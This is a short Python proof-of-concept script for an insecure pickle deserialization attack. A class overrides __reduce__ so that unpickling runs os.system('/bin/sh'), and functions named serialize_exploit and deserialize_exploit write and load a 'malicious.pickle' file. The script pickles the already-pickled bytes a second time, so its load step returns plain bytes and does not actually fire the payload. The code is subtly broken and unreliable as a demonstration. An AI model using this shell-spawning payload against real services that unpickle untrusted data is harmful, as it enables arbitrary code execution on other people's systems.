import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(malicious, f)

def deserialize_exploit():
    with open('malicious.pickle', 'rb') as f:
        pickle.load(f)

serialize_exploit()
deserialize_exploit()
